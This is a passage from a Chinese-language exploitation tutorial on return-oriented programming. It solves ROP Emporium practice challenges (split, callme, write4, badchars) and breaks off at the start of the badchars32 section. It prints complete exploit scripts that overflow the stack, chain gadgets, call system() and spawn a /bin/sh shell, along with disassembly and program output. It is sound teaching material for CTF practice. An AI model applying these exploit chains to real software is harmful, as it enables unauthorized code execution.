payload += l32(0x08048430)
payload += "BBBB"
payload += l32(0x0804a030)
io = zio('./split32')
io.writeline(payload)
io.read()
注意 "BBBB" 是新的返回地址，如果函数 ret，就会执行 "BBBB" 处的指令，通常这
里会放置一些 pop;pop;ret 之类的指令地址，以平衡堆栈。从 system() 函数中
也能看出来，它现将 esp 减去 0xc，再取地址 esp+0x10 处的指令，也就是
"BBBB" 的后一个，即字符串的地址。因为 system() 是 libc 中的函数，所以这
种方法称作 ret2libc。
split
$ rabin2 -z split
...
vaddr=0x00601060 paddr=0x00001060 ordinal=000 sz=18 len=17 secti
on=.data type=ascii string=/bin/cat flag.txt
字符串地址在 0x00601060 。
391
3.1.4 返回导向编程（ROP）（x86）
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
0x0000000000400807 : push rbp
0x0000000000400808 : mov rbp,rsp
0x000000000040080b : mov edi,0x4008ff
0x0000000000400810 : call 0x4005e0 
0x0000000000400815 : nop
0x0000000000400816 : pop rbp
0x0000000000400817 : ret
End of assembler dump.
64 位程序的第一个参数通过 edi 传递，所以我们需要再调用一个 gadgets 来将字符
串的地址存进 edi。
我们先找到需要的 gadgets：
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400883 : (b'5fc3') pop rdi; ret
下面是 payload：
$ python2 -c "print 'A'*40 + '\x83\x08\x40\x00\x00\x00\x00\x00'
+ '\x60\x10\x60\x00\x00\x00\x00\x00' + '\x10\x08\x40\x00\x00\x00
\x00\x00'" | ./split
...
> ROPE{a_placeholder_32byte_flag!}
那我们是否还可以用前面那种方法调用 system() 的 plt 地址 0x4005e0 呢：
392
3.1.4 返回导向编程（ROP）（x86）
gdb-peda$ disassemble system
Dump of assembler code for function system:
0x00007ffff7a63010 : test rdi,rdi
0x00007ffff7a63013 : je 0x7ffff7a63020 
0x00007ffff7a63015 : jmp 0x7ffff7a62a70 
0x00007ffff7a6301a : nop WORD PTR [rax+rax*1+0x0]
0x00007ffff7a63020 : lea rdi,[rip+0x138fd6]
# 0x7ffff7b9bffd
0x00007ffff7a63027 : sub rsp,0x8
0x00007ffff7a6302b : call 0x7ffff7a62a70 
0x00007ffff7a63030 : test eax,eax
0x00007ffff7a63032 : sete al
0x00007ffff7a63035 : add rsp,0x8
0x00007ffff7a63039 : movzx eax,al
0x00007ffff7a6303c : ret
End of assembler dump.
依然可以，因为参数的传递没有用到栈，我们只需把地址直接更改就可以了：
from zio import *
payload = "A"*40
payload += l64(0x00400883)
payload += l64(0x00601060)
payload += l64(0x4005e0)
io = zio('./split')
io.writeline(payload)
io.read()
callme32
这里我们要接触真正的 plt 了，根据题目提示，callme32 从共享库 libcallme32.so
中导入三个特殊的函数：
393
3.1.4 返回导向编程（ROP）（x86）
$ rabin2 -i callme32 | grep callme
ordinal=004 plt=0x080485b0 bind=GLOBAL type=FUNC name=callme_thr
ee
ordinal=005 plt=0x080485c0 bind=GLOBAL type=FUNC name=callme_one
ordinal=012 plt=0x08048620 bind=GLOBAL type=FUNC name=callme_two
我们要做的是依次调用 callme_one() 、 callme_two() 和
callme_three() ，并且每个函数都要传入参数 1 、 2 、 3 。通过调试我们
能够知道函数逻辑， callme_one 用于读入加密后的 flag，然后依次调用
callme_two 和 callme_three 进行解密。
由于函数参数是放在栈上的，为了平衡堆栈，我们需要一个 pop;pop;pop;ret
的 gadgets：
$ objdump -d callme32 | grep -A 3 pop
...
80488a8: 5b pop %ebx
80488a9: 5e pop %esi
80488aa: 5f pop %edi
80488ab: 5d pop %ebp
80488ac: c3 ret
80488ad: 8d 76 00 lea 0x0(%esi),%esi
...
或者是 add esp, 8; pop; ret ，反正只要能平衡，都可以：
gdb-peda$ ropsearch "add esp, 8"
Searching for ROP gadget: 'add esp, 8' in: binary ranges
0x08048576 : (b'83c4085bc3') add esp,0x8; pop ebx; ret
0x080488c3 : (b'83c4085bc3') add esp,0x8; pop ebx; ret
构造 payload 如下：
394
3.1.4 返回导向编程（ROP）（x86）
from zio import *
payload = "A"*44
payload += l32(0x080485c0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)
payload += l32(0x08048620)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)
payload += l32(0x080485b0)
payload += l32(0x080488a9)
payload += l32(0x1) + l32(0x2) + l32(0x3)
io = zio('./callme32')
io.writeline(payload)
io.read()
callme
64 位程序不需要平衡堆栈了，只要将参数按顺序依次放进寄存器中就可以了。
$ rabin2 -i callme | grep callme
ordinal=004 plt=0x00401810 bind=GLOBAL type=FUNC name=callme_thr
ee
ordinal=008 plt=0x00401850 bind=GLOBAL type=FUNC name=callme_one
ordinal=011 plt=0x00401870 bind=GLOBAL type=FUNC name=callme_two
gdb-peda$ ropsearch "pop rdi; pop rsi"
Searching for ROP gadget: 'pop rdi; pop rsi' in: binary ranges
0x00401ab0 : (b'5f5e5ac3') pop rdi; pop rsi; pop rdx; ret
payload 如下：
395
3.1.4 返回导向编程（ROP）（x86）
from zio import *
payload = "A"*40
payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401850)
payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401870)
payload += l64(0x00401ab0)
payload += l64(0x1) + l64(0x2) + l64(0x3)
payload += l64(0x00401810)
io = zio('./callme')
io.writeline(payload)
io.read()
write432
这一次，我们已经不能在程序中找到可以执行的语句了，但我们可以利用 gadgets
将 /bin/sh 写入到目标进程的虚拟内存空间中，如 .data 段中，再调用
system() 执行它，从而拿到 shell。要认识到一个重要的点是，ROP 只是一种任意
代码执行的形式，只要我们有创意，就可以利用它来执行诸如内存读写等操作。
这种方法虽然好用，但还是要考虑我们写入地址的读写和执行权限，以及它能提供
的空间是多少，我们写入的内容是否会影响到程序执行等问题。如我们接下来想把
字符串写入 .data 段，我们看一下它的权限和大小等信息：
396
3.1.4 返回导向编程（ROP）（x86）
$ readelf -S write432
[Nr] Name Type Addr Off Size
ES Flg Lk Inf Al
...
[16] .rodata PROGBITS 080486f8 0006f8 000064
00 A 0 0 4
[25] .data PROGBITS 0804a028 001028 000008
00 WA 0 0 4
可以看到 .data 具有 WA ，即写入（write）和分配（alloc）的权利，而
.rodata 就不能写入。
使用工具 ropgadget 可以很方便地找到我们需要的 gadgets：
$ ropgadget --binary write432 --only "mov|pop|ret"
...
0x08048670 : mov dword ptr [edi], ebp ; ret
0x080486da : pop edi ; pop ebp ; ret
另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成
两次写入，还得注意字符对齐，有没有截断字符（ \x00 , \x0a 等）之类的问
题，比如这里 /bin/sh 只有七个字节，我们可以使用 /bin/sh\00 或者
/bin//sh ，构造 payload 如下：
397
3.1.4 返回导向编程（ROP）（x86）
from zio import *
pop_edi_ebp = 0x080486da
mov_edi_ebp = 0x08048670
data_addr = 0x804a028
system_plt = 0x8048430
payload = ""
payload += "A"*44
payload += l32(pop_edi_ebp)
payload += l32(data_addr)
payload += "/bin"
payload += l32(mov_edi_ebp)
payload += l32(pop_edi_ebp)
payload += l32(data_addr+4)
payload += "/sh\x00"
payload += l32(mov_edi_ebp)
payload += l32(system_plt)
payload += "BBBB"
payload += l32(data_addr)
io = zio('./write432')
io.writeline(payload)
io.interact()
$ python2 run.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA(/binp,/shp0BBBB( 
write4 by ROP Emporium
32bits
Go ahead and give me the string already!
> cat flag.txt
ROPE{a_placeholder_32byte_flag!}
write4
398
3.1.4 返回导向编程（ROP）（x86）
64 位程序就可以一次性写入了。
$ ropgadget --binary write4 --only "mov|pop|ret"
...
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400893 : pop rdi ; ret
from pwn import *
pop_r14_r15 = 0x0000000000400890
mov_r14_r15 = 0x0000000000400820
pop_rdi = 0x0000000000400893
data_addr = 0x0000000000601050
system_plt = 0x004005e0
payload = "A"*40
payload += p64(pop_r14_r15)
payload += p64(data_addr)
payload += "/bin/sh\x00"
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(data_addr)
payload += p64(system_plt)
io = process('./write4')
io.recvuntil('>')
io.sendline(payload)
io.interactive()
badchars32
在这个挑战中，我们依然要将 /bin/sh 写入到进程内存中，但这一次程序在读取
输入时会对敏感字符进行检查，查看函数 checkBadchars() ：
gdb-peda$ disassemble checkBadchars
Dump of assembler code for function checkBadchars:
399
3.1.4 返回导向编程（ROP）（x86）
0x08048801 : push ebp
0x08048802 : mov ebp,esp
0x08048804 : sub esp,0x10
0x08048807 : mov BYTE PTR [ebp-0x10],0x62
0x0804880b : mov BYTE PTR [ebp-0xf],0x69
0x0804880f : mov BYTE PTR [ebp-0xe],0x63
0x08048813 : mov BYTE PTR [ebp-0xd],0x2f
0x08048817 : mov BYTE PTR [ebp-0xc],0x20
0x0804881b : mov BYTE PTR [ebp-0xb],0x66
0x0804881f : mov BYTE PTR [ebp-0xa],0x6e
0x08048823 : mov BYTE PTR [ebp-0x9],0x73
0x08048827 : mov DWORD PTR [ebp-0x4],0x0
0x0804882e : mov DWORD PTR [ebp-0x8],0x0
0x08048835 : mov DWORD PTR [ebp-0x4],0x0
0x0804883c : jmp 0x804887c 
0x0804883e : mov DWORD PTR [ebp-0x8],0x0
0x08048845 : jmp 0x8048872 
0x08048847 : mov edx,DWORD PTR [ebp+0x8]
0x0804884a : mov eax,DWORD PTR [ebp-0x4]
0x0804884d : add eax,edx
0x0804884f : movzx edx,BYTE PTR [eax]
0x08048852 : lea ecx,[ebp-0x10]
0x08048855 : mov eax,DWORD PTR [ebp-0x8]
0x08048858 : add eax,ecx
0x0804885a : movzx eax,BYTE PTR [eax]
0x0804885d : cmp dl,al
0x0804885f : jne 0x804886e 
0x08048861 : mov edx,DWORD PTR [ebp+0x8]
0x08048864 : mov eax,DWORD PTR [ebp-0x4]
0x08048867 : add eax,edx
0x08048869 : mov BYTE PTR [eax],0xeb
0x0804886c : jmp 0x8048878 
0x0804886e : add DWORD PTR [ebp-0x8],0x1
0x08048872 : cmp DWORD PTR [ebp-0x8],0x7
0x08048876 : jbe 0x8048847 
0x08048878 : add DWORD PTR [ebp-0x4],0x1
0x0804887c : mov eax,DWORD PTR [ebp-0x4]
0x0804887f : cmp eax,DWORD PTR [ebp+0xc]
0x08048882 : jb 0x804883e 
0x08048884 : nop
400
3.1.4 返回导向编程（ROP）（x86）
0x08048885 : leave
0x08048886 : ret
End of assembler dump.
很明显，地址 0x08048807 到 0x08048823 的字符就是所谓的敏感字符。处理
敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地
址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。
找到 gadgets：
$ ropgadget --binary badchars32 --only "mov|pop|ret|xor"
...
0x08048893 : mov dword ptr [edi], esi ; ret